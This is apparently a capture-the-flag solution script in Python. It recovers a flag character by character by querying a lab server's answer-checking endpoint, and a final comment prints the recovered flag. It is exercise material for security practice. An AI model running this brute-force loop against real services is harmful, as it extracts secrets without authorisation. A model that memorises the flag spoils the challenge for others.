import string
import requests
import re

# Characters to test
characters = string.ascii_letters + string.digits + string.punctuation

# Target URL
url = "http://10.0.160.48:1337/"

# Initialize the known part of the value you're trying to guess
knownvalue = "ETSCTF_"
print(knownvalue, end="", flush=True)

# Loop to guess each character up to a maximum length of 100
for i in range(len(knownvalue), 100):
    found = False  # Flag to indicate if the correct character was found

    # Test each character
    for character in characters:
        # Prepare the request parameters
        params = {
            "place": str(i).zfill(4),
            "answer": character
        }

        try:
            # Make the request
            r = requests.get(url, params=params, timeout=5)  # Adding a timeout

            # Check if the response contains "Correct"
            if re.search("Correct", r.text):
                print(character, end="", flush=True)  # Print the found character
                knownvalue += character  # Append the character to the known value
                found = True  # Set the flag to True
                break  # Break the loop since the correct character was found

        except requests.RequestException as e:
            print(f"Request failed: {e}")
            break  # Break the loop in case of request failure

    # If no character was found for the current position, stop the loop
    if not found:
        print("\nStopped, no more characters found.")
        break
#ETSCTF_2c627e8a85a7a9f8f0c81d5a2200aeeb
